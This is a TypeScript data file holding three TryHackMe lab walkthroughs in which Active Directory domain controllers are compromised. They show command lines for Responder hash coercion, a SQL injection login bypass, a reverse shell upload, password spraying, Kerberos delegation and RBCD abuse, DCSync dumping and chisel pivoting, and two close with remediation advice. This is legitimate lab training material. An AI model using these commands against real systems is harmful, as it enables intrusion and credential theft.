export interface Writeup {
  slug: string;
  title: string;
  excerpt: string;
  date: string;
  publishedAt: string;
  readTime: string;
  platformTag: "CTF" | "BlockChain" | "Bug Bounty" | string;
  tags: string[];
  contentHtml: string;
}

export const writeups: Writeup[] = [
  {
    slug: "tryhackme-proxy-walkthrough",
    title: "TryHackMe: Proxy Walkthrough",
    excerpt: "End-to-end compromise of an Active Directory Domain Controller: anonymous SMB share discovery, NetNTLMv2 coercion with Responder, BloodHound mapping, and Kerberos Constrained Delegation exploitation.",
    date: "Oct 2026",
    publishedAt: "2026-10-24",
    readTime: "7 min",
    platformTag: "TryHackMe",
    tags: ["ActiveDirectory", "AD Pentesting"],
    contentHtml: `
      <b>Room Link: </b> <u><a href="https://tryhackme.com/room/proxychallenge" target="_blank" rel="noopener noreferrer">https://tryhackme.com/room/proxychallenge</a></u>
      <h2>Summary</h2>
      <p><strong>Proxy</strong> is an Active Directory machine on TryHackMe. The objective is to navigate an AD environment, intercept service credentials, and escalate to Domain Administrator through Kerberos abuse.</p>
      
      <ul>
        <li><strong>Recon:</strong> Fast port discovery with RustScan & Nmap fingerprinting (Ports 53, 88, 389, 445).</li>
        <li><strong>SMB Enumeration:</strong> Anonymous guest access to <code>IT-Shared</code> exposing staff onboarding notes.</li>
        <li><strong>Domain Graph Analysis:</strong> BloodHound enumeration discovering <code>AllowedToDelegate</code> on <code>svc.scanner</code>.</li>
        <li><strong>Privilege Escalation:</strong> Kerberos Constrained Delegation abuse with <code>Impacket-getST.py</code>, DCSync hash dumping, and WinRM shell.</li>
      </ul>

      <h2>1. Reconnaissance & Port Scanning</h2>
      <p>We initiate the assessment with <strong>RustScan</strong> to rapidly discover open ports, piping them directly to Nmap for service detection:</p>
      <pre><code>rustscan -a 10.114.168.198 -b 500 --top -- -sC -sV -oN Proxy</code></pre>
      
      <img src="/images/writeups/Proxy/rustscan.webp" alt="RustScan Port Discovery" class="rounded border border-border my-4 w-full" />
      <img src="/images/writeups/Proxy/rustscan-nmap.webp" alt="Nmap Service Scan" class="rounded border border-border my-4 w-full" />
      
      <p>The scan reveals a Windows Domain Controller (<strong>DC01.ctf.local</strong>):</p>
      <ul>
        <li><strong>Port 53:</strong> Microsoft DNS</li>
        <li><strong>Port 88:</strong> Kerberos (Domain Controller identifier)</li>
        <li><strong>Port 135:</strong> MSRPC</li>
        <li><strong>Port 389 / 3268:</strong> LDAP / Global Catalog</li>
        <li><strong>Port 445:</strong> SMB</li>
      </ul>

      <h2>2. SMB Share Enumeration & Host Entry</h2>
      <p>Using <strong>NetExec (nxc)</strong>, we test for null and guest SMB authentication:</p>
      <pre><code>nxc smb 10.114.168.198 -u 'guest' -p '' --shares</code></pre>
      
      <img src="/images/writeups/Proxy/nxc_smb_shares.webp" alt="SMB Shares Enumeration" class="rounded border border-border my-4 w-full" />
      
      <p>The target allows guest access to <code>IT-Shared</code> with <strong>READ and WRITE</strong> permissions. We connect interactively with <code>smbclient</code> and download all documents:</p>
      <pre><code>smbclient //10.114.168.198/IT-Shared -N
smb: \\> dir
smb: \\> mget *</code></pre>

      <img src="/images/writeups/Proxy/smb_share_data.webp" alt="SMB Shared Files" class="rounded border border-border my-4 w-full" />
      <img src="/images/writeups/Proxy/smb_share_data_file.png" alt="Inspecting Onboarding Checklist" class="rounded border border-border my-4 w-full" />

      <p>In <code>IT-Onboarding-Checklist.txt</code>, we uncover a crucial operational detail: <em>an automated scanner running under <code>svc.scanner</code> processes newly dropped files every 2 minutes</em>.</p>
      
      <p>We generate the <code>/etc/hosts</code> entry using NetExec:</p>
      <pre><code>nxc smb 10.114.168.198 -u 'guest' -p '' --generate-hosts-file host</code></pre>
      <img src="/images/writeups/Proxy/nxc_generate-host-file.webp" alt="Generate hosts entry" class="rounded border border-border my-4 w-full" />

      <h2>3. Credential Harvesting (Responder & John)</h2>
      <p>Since <code>svc.scanner</code> inspects new files, we can coerce an SMB authentication attempt by placing a PowerShell file that calls a UNC path pointing to our listener.</p>
      
      <p>Start Responder on the VPN tunnel interface:</p>
      <pre><code>sudo responder -I tun0 -dvw</code></pre>
      <img src="/images/writeups/Proxy/responder.webp" alt="Starting Responder" class="rounded border border-border my-4 w-full" />

      <p>We upload a one-line PowerShell script referencing our IP:</p>
      <pre><code>Get-ChildItem //192.168.131.251/t.txt</code></pre>
      <img src="/images/writeups/Proxy/smb_upload_file.webp" alt="Uploading script to SMB share" class="rounded border border-border my-4 w-full" />

      <p>Within 2 minutes, Responder catches the incoming NetNTLMv2 hash from <code>svc.scanner</code>:</p>
      <img src="/images/writeups/Proxy/got_the_hash.webp" alt="Captured NetNTLMv2 Hash" class="rounded border border-border my-4 w-full" />

      <p>We save the complete hash line and crack it offline using <strong>John the Ripper</strong>:</p>
      <pre><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
      <img src="/images/writeups/Proxy/john_crack_hash.webp" alt="Cracking Hash with John" class="rounded border border-border my-4 w-full" />

      <p>We verify the cracked credentials against the Domain Controller and list active users:</p>
      <pre><code>nxc smb 10.114.168.198 -u 'svc.scanner' -p '&lt;PASSWORD&gt;' --users</code></pre>
      <img src="/images/writeups/Proxy/nxc_smb_list_users.webp" alt="Verifying Credentials" class="rounded border border-border my-4 w-full" />

      <h2>4. Active Directory Graph Analysis (BloodHound)</h2>
      <p>With valid domain credentials, we run <code>bloodhound-python</code> to ingest domain objects, memberships, and ACLs:</p>
      <pre><code>bloodhound-python -u 'svc.scanner' -p '&lt;PASSWORD&gt;' -d ctf.local -dc DC01.ctf.local -ns 10.114.168.198 -c ALL --zip</code></pre>
      <img src="/images/writeups/Proxy/bloodhound_enum.webp" alt="BloodHound Ingestion" class="rounded border border-border my-4 w-full" />

      <p>Uploading the zip to BloodHound reveals that <code>svc.scanner</code> has <strong>AllowedToDelegate</strong> permissions targeting <code>cifs/DC01.ctf.local</code> on the Domain Controller:</p>
      <img src="/images/writeups/Proxy/bloodhound_enum_graph.png" alt="BloodHound Graph" class="rounded border border-border my-4 max-w-md mx-auto block shadow-sm" />
      <img src="/images/writeups/Proxy/bloodhound_enum_graph_abuse.png" alt="BloodHound Abuse Info" class="rounded border border-border my-4 max-w-md mx-auto block shadow-sm" />

      <h2>5. Privilege Escalation: Kerberos Constrained Delegation</h2>
      <h3>Why is Constrained Delegation Vulnerable?</h3>
      <p>Constrained Delegation allows a service account (<code>svc.scanner</code>) to impersonate users to a specific SPN (<code>cifs/DC01.ctf.local</code>).</p>
      <p>Using the Kerberos Service-for-User (S4U) extensions:</p>
      <ul>
        <li><strong>S4U2self:</strong> The account requests a Kerberos ticket to <em>itself</em> on behalf of any arbitrary domain user (including <code>Administrator</code>), without requiring that user's password.</li>
        <li><strong>S4U2proxy:</strong> The account then exchanges that ticket with the KDC for a valid service ticket to access the delegated target (<code>cifs/DC01.ctf.local</code>) as the impersonated user.</li>
      </ul>

      <p>We abuse this mechanism to forge a service ticket for <strong>Administrator</strong> using Impacket's <code>getST.py</code>:</p>
      <pre><code>impacket-getST ctf.local/svc.scanner:'&lt;PASSWORD&gt;' -spn cifs/DC01.ctf.local -impersonate Administrator -dc-ip DC01.ctf.local</code></pre>
      <img src="/images/writeups/Proxy/impacket-getST.webp" alt="Forging Ticket with getST" class="rounded border border-border my-4 w-full" />

      <p>We export the ticket into our shell session:</p>
      <pre><code>export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache</code></pre>
      <img src="/images/writeups/Proxy/export.webp" alt="Exporting KRB5CCNAME" class="rounded border border-border my-4 w-full" />

      <p>With administrative CIFS access, we perform a DCSync dump against the Domain Controller without requiring passwords (<code>-k -no-pass</code>):</p>
      <pre><code>impacket-secretsdump -k -no-pass ctf.local/Administrator@DC01.ctf.local</code></pre>
      <img src="/images/writeups/Proxy/impacket-secretdump.webp" alt="DCSync SecretsDump" class="rounded border border-border my-4 w-full" />

      <p>Secretsdump dumps the NTDS database, exposing the built-in Administrator NTLM hash. We gain an interactive administrative shell using <strong>Evil-WinRM</strong>:</p>
      <pre><code>evil-winrm -u Administrator -H &lt;ADMIN_NTLM_HASH&gt; -i 10.114.168.198</code></pre>
      <img src="/images/writeups/Proxy/evil-winrm.png" alt="Administrator Shell with Evil-WinRM" class="rounded border border-border my-4 w-full" />
    `,
  },
  {
    slug: "tryhackme-forward-walkthrough",
    title: "TryHackMe: Forward Walkthrough",
    excerpt: "Assumed breach Active Directory assessment: RDP pivoting, KeePass vault extraction, domain password spraying, and Domain Controller compromise via Resource-Based Constrained Delegation (RBCD).",
    date: "Oct 2026",
    publishedAt: "2026-10-25",
    readTime: "8 min",
    platformTag: "TryHackMe",
    tags: ["ActiveDirectory", "AD Pentesting"],
    contentHtml: `
    <b>Room Link: </b> <u><a href="https://tryhackme.com/room/forwardchallenge" target="_blank" rel="noopener noreferrer">https://tryhackme.com/room/forwardchallenge</a></u>
      <h2>Scenario: Assumed Breach</h2>
      <p>The engagement begins under an assumed breach model with low-privilege domain user credentials:</p>
      <pre><code>[ INITIAL ACCESS GRANTED ]
DOMAIN : ctf.local
USER   : ctf.local\\j.smith
PASS   : JSmith@IT2024</code></pre>
      
      <p>Target Domain Controller: <code>DC01.ctf.local</code> (<code>10.112.186.154</code>)</p>

      <h2>1. Initial Reconnaissance</h2>
      <p>We initiate the assessment with <strong>RustScan</strong> to rapidly discover open ports, piping them directly to Nmap for service detection:</p>
      <pre><code>rustscan -a 10.112.186.154 -b 500 --top -- -sC -sV -Pn -oN Forward</code></pre>

      <img src="/images/writeups/Forward/rustscan.png" alt="RustScan Port Discovery" class="rounded border border-border my-4 w-full" />

      <p>The scan confirms a Windows-based Domain Controller (<strong>DC01.ctf.local</strong>):</p>
      <ul>
        <li><strong>Port 53:</strong> Microsoft DNS</li>
        <li><strong>Port 88:</strong> Kerberos</li>
        <li><strong>Port 135:</strong> MSRPC</li>
        <li><strong>Port 389:</strong> LDAP</li>
        <li><strong>Port 445:</strong> SMB</li>
      </ul>

      <img src="/images/writeups/Forward/rustscan+nmap.png" alt="Nmap Service Scan" class="rounded border border-border my-4 w-full" />

      <p>Using <strong>NetExec (nxc)</strong>, we authenticate as <code>j.smith</code> and generate the hosts file:</p>
      <pre><code>nxc smb 10.112.186.154 -u 'j.smith' -p 'JSmith@IT2024' --generate-hosts-file hosts</code></pre>
      <img src="/images/writeups/Forward/nxc_generat-hosts-file.png" alt="NetExec Generate Hosts" class="rounded border border-border my-4 w-full" />

      <p>We list the available shares and their permissions:</p>
      <pre><code>nxc smb DC01.ctf.local -d ctf.local -u 'j.smith' -p 'JSmith@IT2024' --shares</code></pre>
      <img src="/images/writeups/Forward/nxc_smb_shares-list.png" alt="SMB Shares List" class="rounded border border-border my-4 w-full" />

      <p>Connecting with <strong>SMB</strong> via <code>impacket-smbclient</code> shows that the accessible shares do not contain any actionable artifacts:</p>
      <pre><code>impacket-smbclient ctf.local/j.smith:'JSmith@IT2024'@ctf.local</code></pre>
      <img src="/images/writeups/Forward/impacket-smbclient_see-shares.png" alt="SMBClient Check Shares" class="rounded border border-border my-4 w-full" />

      <p>We export the list of domain users for future spraying:</p>
      <pre><code>nxc smb DC01.ctf.local -d ctf.local -u 'j.smith' -p 'JSmith@IT2024' --users-export users</code></pre>
      <img src="/images/writeups/Forward/nxc_smb_enum-users.png" alt="Enumerate Users" class="rounded border border-border my-4 w-full" />

      <h2>2. Bloodhound Enumeration</h2>
      <p>We proceed with domain collection using <code>bloodhound-python</code>:</p>
      <pre><code>bloodhound-python -u 'j.smith' -p 'JSmith@IT2024' -d ctf.local -dc DC01.ctf.local -ns 10.112.186.154 -c All --zip</code></pre>
      <img src="/images/writeups/Forward/bloodhound_enum_zip.png" alt="BloodHound Ingestion Archive" class="rounded border border-border my-4 w-full" />
      <img src="/images/writeups/Forward/bloodhound_enum_fileupload.png" alt="Upload to BloodHound" class="rounded border border-border my-4 w-full" />

      <p>In BloodHound, we discover that <code>j.smith</code> is a member of the built-in <strong>REMOTE DESKTOP USERS</strong> group, permitting graphical remote login to the machine:</p>
      <img src="/images/writeups/Forward/bloodhound_enum_j.smith.png" alt="BloodHound j.smith Node" class="rounded border border-border my-4 w-full" />

      <h2>3. Lateral Movement: RDP Session & KeePass Discovery</h2>
      <p>We launch a remote desktop session using <code>xfreerdp</code>:</p>
      <pre><code>xfreerdp /u:j.smith /p:'JSmith@IT2024' /v:DC01.ctf.local /cert:ignore /dynamic-resolution</code></pre>
      <img src="/images/writeups/Forward/xfreerdp_connect1.png" alt="RDP Connection" class="rounded border border-border my-4 w-full" />

      <p>Searching the user directory in PowerShell reveals an encrypted KeePass database file:</p>
      <pre><code>Get-ChildItem -Path 'C:\\Users\\j.smith\\' -Recurse</code></pre>
      <img src="/images/writeups/Forward/rdp_data .png" alt="KeePass Database Found" class="rounded border border-border my-4 w-full" />

      <p>Opening KeePass 2, we authenticate using the Windows User Account option without entering a master password. The database reveals stored credentials for user <strong>t.jones</strong>:</p>
      <img src="/images/writeups/Forward/rdp_tjones.png" alt="KeePass t.jones Password" class="rounded border border-border my-4 w-full" />

      <p>We test the credentials using NetExec and authenticate as <code>t.jones</code>:</p>
      <pre><code>nxc smb DC01.ctf.local -d ctf.local -u 't.jones' -p '&lt;passwd&gt;' --shares</code></pre>
      <img src="/images/writeups/Forward/t-jones_smb_verfi.png" alt="NetExec t.jones Verification" class="rounded border border-border my-4 w-full" />
      <p><strong>Note:</strong> <code>t.jones</code> does not have any special privileges.</p>


      <h2>4. Lateral Movement: Password Spraying</h2>
      <p>With valid credentials for <code>t.jones</code>, we spray the password across the harvested domain user list:</p>
      <pre><code>nxc smb DC01.ctf.local -d ctf.local -u users -p '&lt;passwd&gt;' --continue-on-success</code></pre>
      <img src="/images/writeups/Forward/nxc_passwd_spray.png" alt="Password Spray Results" class="rounded border border-border my-4 w-full" />

      <p><strong>Result:</strong> <code>r.williams</code> shares the exact same password as <code>t.jones</code>!</p>

      <h2>5. Escalate Privileges: Resource-Based Constrained Delegation (RBCD)</h2>
      <p>In BloodHound, we inspect the outbound permissions for <strong>r.williams</strong> and find the <strong>AddAllowedToAct</strong> edge over the Domain Controller:</p>
      <img src="/images/writeups/Forward/bloodhound_rwilliams.png" alt="BloodHound r.williams AddAllowedToAct" class="rounded border border-border my-4 max-w-md mx-auto block shadow-sm" />

      <h3>Understanding RBCD vs. Traditional Constrained Delegation</h3>
      <ul>
        <li><strong>Traditional Constrained Delegation:</strong> Configured on the front-end service account (<code>msDS-AllowedToDelegateTo</code>) by a Domain Admin.</li>
        <li><strong>Resource-Based Constrained Delegation:</strong> Configured directly on the target resource (<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>). Anyone with write access over the target computer can configure which accounts are allowed to impersonate users to it.</li>
      </ul>

      <p><strong>Step 1:</strong> We create a new machine account (<code>SYS$</code>) in the domain using <code>r.williams</code>' credentials:</p>
      <pre><code>impacket-addcomputer ctf.local/r.williams:'&lt;passwd&gt;' -computer-name SYS$ -computer-pass '&lt;passwd&gt;' -dc-ip DC01.ctf.local</code></pre>
      <img src="/images/writeups/Forward/impacket-addaccont.png" alt="Impacket Add Computer" class="rounded border border-border my-4 w-full" />

      <p><strong>Step 2:</strong> We write our controlled <code>SYS$</code> machine account into the DC's <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute:</p>
      <pre><code>impacket-rbcd ctf.local/r.williams:'&lt;passwd&gt;' -dc-ip DC01.ctf.local -delegate-from 'SYS$' -delegate-to 'DC01$' -action 'write'</code></pre>
      <img src="/images/writeups/Forward/impacket-rbcd.png" alt="Impacket RBCD Write" class="rounded border border-border my-4 w-full" />

      <p><strong>Step 3:</strong> Using <code>SYS$</code>, we abuse S4U2Self and S4U2Proxy to request a Kerberos service ticket for <code>cifs/DC01.ctf.local</code> while impersonating <strong>Administrator</strong>:</p>
      <pre><code>impacket-getST -dc-ip DC01.ctf.local -spn cifs/DC01.ctf.local -impersonate Administrator ctf.local/SYS$:'&lt;passwd&gt;'</code></pre>
      <img src="/images/writeups/Forward/impacket-getST.png" alt="Impacket getST Impersonate" class="rounded border border-border my-4 w-full" />

      <p>We export the ticket into our environment:</p>
      <pre><code>export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache</code></pre>

      <p><strong>Step 4:</strong> We execute DCSync against the Domain Controller using the Kerberos ticket:</p>
      <pre><code>impacket-secretsdump -k -no-pass ctf.local/Administrator@DC01.ctf.local</code></pre>
      <img src="/images/writeups/Forward/impacket-secrets.png" alt="SecretsDump DCSync" class="rounded border border-border my-4 w-full" />

      <h2>6. Gaining Shell & Capturing the Flag</h2>
      <p>With the Administrator NTLM hash obtained, we authenticate over WinRM using <strong>Evil-WinRM</strong>:</p>
      <pre><code>evil-winrm -u Administrator -H &lt;hash&gt; -i DC01.ctf.local</code></pre>
      <img src="/images/writeups/Forward/evil-winrm.png" alt="Evil-WinRM Administrator Shell" class="rounded border border-border my-4 w-full" />

      <p>Locate and capture the final flag:</p>
      <pre><code>Get-ChildItem -Path "C:\\Users\\Administrator" -Filter "*.txt" -Recurse</code></pre>

      <h2>7. Key Takeaways & Remediation</h2>
      <ul>
        <li><strong>Audit ACLs on Computer Objects:</strong> Restrict write permissions on Domain Controllers to Domain Admins only. Helpdesk and standard users should never hold <code>GenericWrite</code> or <code>WriteProperty</code> on tier-0 assets.</li>
        <li><strong>Set MachineAccountQuota to 0:</strong> Prevent unprivileged domain users from joining new computer accounts to the domain.</li>
        <li><strong>Enforce Unique Passwords:</strong> Disallow password reuse across users to mitigate horizontal spraying attacks.</li>
        <li><strong>Protect High-Privilege Accounts:</strong> Add Domain Admins to the <em>Protected Users</em> group to prevent Kerberos delegation impersonation.</li>
      </ul>
    `,
  },
  {
    slug: "tryhackme-dead-drop-walkthrough",
    title: "TryHackMe: Dead Drop Walkthrough",
    excerpt: "End-to-end compromise of an internal Active Directory domain via DMZ web application: SQL injection bypass, reverse shell foothold, shadow hash cracking, APK credential extraction, Chisel pivoting, and PsExec Domain Controller takeover.",
    date: "Oct 2026",
    publishedAt: "2026-10-26",
    readTime: "8 min",
    platformTag: "TryHackMe",
    tags: ["ActiveDirectory", "AD Pentesting", "Pivoting", "Chisel"],
    contentHtml: `
      <b>Room Link: </b> <u><a href="https://tryhackme.com/room/dead-drop" target="_blank" rel="noopener noreferrer">https://tryhackme.com/room/dead-drop</a></u>

      <h2>Scenario</h2>
      <p>You have been engaged as a penetration tester for a security audit of <strong>DeadDrop Ltd</strong>, a document management company that provides file-sharing services to corporate clients. The company recently expanded its infrastructure and wants assurance that its systems are secure before onboarding a major new client.</p>
      <p>Your point of entry is a web-facing file-sharing application. Behind it sits an internal corporate network that you have no direct access to. Your objective is clear: compromise the Domain Controller and retrieve the flag from the Administrator's desktop. How you get there is up to you.</p>

      <h2>1. Recon</h2>
      <p>This room has multiple machines, and we only have access to <code>192.168.11.200</code>. We use <code>nmap</code> to scan the target machine for open ports and services.</p>
      <pre><code>nmap -F -sV -sC 192.168.11.200</code></pre>
      <img src="/images/writeups/Dead Drop/nmap_web.png" alt="Nmap scan results for 192.168.11.200" class="rounded border border-border my-4 w-full" />
      <p>On the target, we have SSH available on port 22 and a web server on port 80.</p>

      <h2>2. Access as svc-drop</h2>
      <h3>SQL Injection</h3>
      <p>We visit the web page at <code>192.168.11.200</code> and are redirected to <code>/login</code>.</p>
      <img src="/images/writeups/Dead Drop/web_login_page.png" alt="DeadDrop web login page" class="rounded border border-border my-4 w-full" />

      <p>We don't have any credentials, so we try to bypass the login page using SQL injection.</p>
      <pre><code>admin' -- </code></pre>
      <img src="/images/writeups/Dead Drop/sql_inject.png" alt="SQL injection login bypass" class="rounded border border-border my-4 w-full" />
      <p>And we successfully bypass the login page and are redirected to <code>/dashboard</code>.</p>

      <h3>Reverse Shell</h3>
      <p>Here we can see a file upload functionality, which allows us to upload files to the server. We can use this to upload a <code>reverse</code> shell and get a shell on the server.</p>
      <img src="/images/writeups/Dead Drop/upload_shell.png" alt="Uploading reverse shell" class="rounded border border-border my-4 w-full" />
      <p>Tool I used to generate the reverse shell: <a href="https://www.revshells.com/" target="_blank" rel="noopener noreferrer"><strong>revshells</strong></a></p>

      <p>And we successfully got a shell.</p>
      <img src="/images/writeups/Dead Drop/got_the_shell.png" alt="Reverse shell connected" class="rounded border border-border my-4 w-full" />

      <p>In the home directory, we find a <code>backup</code> directory. And inside the <code>backup</code> directory, we find a file called <code>shadow.bak</code> that contains the hash.</p>
      <img src="/images/writeups/Dead Drop/got_the_hash.png" alt="shadow.bak file hash" class="rounded border border-border my-4 w-full" />

      <h3>Crack the Hash</h3>
      <p>I use the <code>john</code> tool to crack the hash and get the password.</p>
      <pre><code>john --format=sha512crypt hash --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
      <img src="/images/writeups/Dead Drop/john_hash_cracked.png" alt="Cracking hash with John the Ripper" class="rounded border border-border my-4 w-full" />

      <p>We test the credentials and try to log in to the web server via SSH and are successful.</p>
      <img src="/images/writeups/Dead Drop/ssh_login_success.png" alt="SSH login as svc-drop" class="rounded border border-border my-4 w-full" />

      <p>In the <code>backup</code> directory, we find nmap. Now run <code>nmap</code> to scan the <code>DC</code>.</p>
      <pre><code>./nmap -F -Pn 192.168.11.100 -oN DC</code></pre>
      <img src="/images/writeups/Dead Drop/nmap_DC.png" alt="Nmap scan of Domain Controller" class="rounded border border-border my-4 w-full" />

      <h2>3. Access as j.harris</h2>
      <p>In the backup directory, we find a <code>.apk</code> file and transfer it to our attacker machine by using <code>scp</code>.</p>
      <img src="/images/writeups/Dead Drop/get_the_.apk_file.png" alt="Transferring APK via scp" class="rounded border border-border my-4 w-full" />

      <p>We open the <code>.apk</code> file in <code>jadx</code> and find a password for the user <code>j.harris</code>.</p>
      <img src="/images/writeups/Dead Drop/recover password.png" alt="Credentials extracted in jadx" class="rounded border border-border my-4 w-full" />

      <p>Now we have the credentials for <code>j.harris</code>. To test these credentials, first, we should be able to send traffic to the <code>DC</code>. As you know, in this room, we are not allowed to send traffic to the <code>DC</code>. So now we have to pivot, make a tunnel through <code>192.168.11.200</code> to the <code>DC</code>.</p>
      <p>For this, we use <code>chisel</code>. To make a tunnel, our compromised machine should have this tool too, so we transfer <code>chisel</code> by using the <code>scp</code>.</p>
      <img src="/images/writeups/Dead Drop/scp_chisel_transfer.png" alt="Transfer chisel using scp" class="rounded border border-border my-4 w-full" />

      <pre><code># Start a chisel server on our attacker machine
chisel server --socks5 --reverse

# Start a chisel client on the compromised machine
chisel client --fingerprint &lt;fingerprint&gt; 192.168.21.5:8080 R:socks</code></pre>

      <p>Here we successfully create a tunnel.</p>
      <img src="/images/writeups/Dead Drop/chisel_connection.png" alt="Chisel connection established" class="rounded border border-border my-4 w-full" />

      <p>To successfully make a connection to the DC by using a tunnel, we should use a <code>proxychains</code> keyword before every command we will run on our system. So our traffic will go through our compromised machine and then directed to the DC. Now we use the <code>nxc</code> to authenticate as the <code>j.harris</code> and list all the shares and the users.</p>
      <pre><code># Use proxychains to route traffic through the tunnel

# List all the users
proxychains nxc smb 192.168.11.100 -u 'j.harris' -p '&lt;passwd&gt;' --users-export users

# List all the shares
proxychains nxc smb DEADDROP-DC.deaddrop.loc -u 'j.harris' -p '&lt;passwd&gt;' --shares</code></pre>

      <img src="/images/writeups/Dead Drop/nxc_smb_users.png" alt="NetExec SMB users enumeration" class="rounded border border-border my-4 w-full" />
      <img src="/images/writeups/Dead Drop/nxc_smb_shares.png" alt="NetExec SMB shares listing" class="rounded border border-border my-4 w-full" />

      <p>We successfully authenticated. Notice that <code>j.harris</code> is a member of the Admins group. Look for the <code>(Pwn3d!)</code> marker in the output that confirms local admin access.</p>

      <h2>4. Domain Controller Compromise & Flag Capture</h2>
      <p>Now we use the <code>impacket-psexec</code> to get a shell on the DC as <code>j.harris</code>.</p>
      <pre><code>proxychains impacket-psexec deaddrop.loc/j.harris:'&lt;passwd&gt;'@192.168.11.100</code></pre>

      <p>And also we got the <strong>flag</strong>.</p>
      <pre><code>Get-ChildItem -Path 'C:\\Users\\' -Recurse  -Filter "*.txt"</code></pre>
      <img src="/images/writeups/Dead Drop/got_the_flag.png" alt="Shell and flag on DC" class="rounded border border-border my-4 w-full" />

      <h2>5. BloodHound Enumeration</h2>
      <p>With the credentials of <code>j.harris</code>, we can enumerate the Domain using <code>bloodhound-python</code>.</p>
      <pre><code>proxychains bloodhound-python -u 'j.harris' -p '&lt;passwd&gt;' -d deaddrop.loc -ns 192.168.11.100 -c All --zip --dns-tcp</code></pre>

      <img src="/images/writeups/Dead Drop/bloodhound_enum.png" alt="BloodHound enumeration" class="rounded border border-border my-4 w-full" />
      <img src="/images/writeups/Dead Drop/bloodhound_enum.groups.png" alt="BloodHound group graph" class="rounded border border-border my-4 max-w-md mx-auto block shadow-sm" />

      <p>The graph showed <code>j.harris</code> held an <code>AddMember</code> ACL right over a group called <strong>ITSupport-Admins</strong> &mdash; and that group was itself nested inside <strong>Domain Admins</strong>. That's a direct, one-hop escalation: anyone who can add members to ITSupport-Admins can add themselves, and inherit Domain Admin membership transitively.</p>

      <p><strong>Note:</strong> Doesn't need to escalate the privileges. We achieved our goals.</p>

      <h2>6. Key Takeaways & Remediation</h2>
      <ul>
        <li><strong>Prevent SQL Injection:</strong> Implement parameterized queries / prepared statements on all authentication endpoints.</li>
        <li><strong>Secure File Uploads:</strong> Enforce strict extension whitelisting, sanitize file names, and store uploads in directories where server-side script execution is disabled.</li>
        <li><strong>File Permission & Backup Hygiene:</strong> Never leave backup files like <code>shadow.bak</code> in non-root or world-readable folders.</li>
        <li><strong>Decompile Mobile Artifacts (Hardcoded Secrets):</strong> Never hardcode production credentials or API keys inside mobile application packages (APKs).</li>
        <li><strong>Network Segmentation & Least Privilege:</strong> Restrict outbound pivoting from DMZ servers and ensure regular domain users do not hold administrative privileges on Domain Controllers.</li>
      </ul>
    `,
  },
];